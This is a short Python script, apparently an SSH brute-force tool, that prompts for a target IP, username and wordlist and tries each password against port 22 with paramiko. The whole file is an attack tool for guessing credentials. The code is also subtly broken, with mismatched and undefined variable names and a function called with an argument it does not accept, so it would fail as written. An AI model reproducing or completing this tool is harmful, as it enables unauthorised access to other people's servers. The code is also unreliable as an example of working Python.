import paramiko
import os
import sys


def bruter():
	target = str(input('What Is The Target IP Address:\n> '))
	user = str(input('Please Enter A Username To Bruteforce:\n> '))
	passFile = str(input('Please Provide A Path To Wordlist File:\n> '))

	def ssh_connect():
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		try:
			ssh.connect(target, port=22, username=username, password=password)
		except:
			code = 1
		ssh.close()
		return code

	with open(password_file, 'r') as file:
		for line in file.readlines():
			password = line.strip()
			try:
				response = ssh_connect(password)
				if response == 0:
					print('[+] Password Found [+]  -->  ' + password)
					exit(0)
				elif response == 1:
					print('[-] No Luck [-]')
			except Exception as e:
				print(e)
			pass
	input_file.close()
